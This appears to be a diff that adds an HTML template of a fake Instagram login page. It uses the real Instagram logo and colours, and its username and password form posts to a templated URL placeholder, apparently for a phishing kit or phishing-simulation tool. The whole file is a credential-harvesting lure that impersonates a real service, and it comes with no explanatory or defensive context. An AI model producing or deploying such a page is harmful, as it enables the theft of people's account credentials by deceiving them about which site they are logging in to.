@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            padding: 50px;
+            text-align: center;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            margin: auto;
+        }
+        .container img {
+            width: 100%;
+            max-width: 180px;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 5px;
+            background-color: #3897f0;
+            border: 1px solid #3897f0;
+            color: white;
+            font-size: 16px;
+        }
+        input[type="submit"]:hover {
+            background-color: #2680d2;
+        }
+        .forgot-password {
+            margin-top: 10px;
+            color: #3897f0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Instagram Logo from Wikimedia -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo">
+        <h2>Instagram</h2>
+        <form action="{{.URL}}" method="POST">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="submit" value="Log in">
+        </form>
+        <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+</body>
+</html>
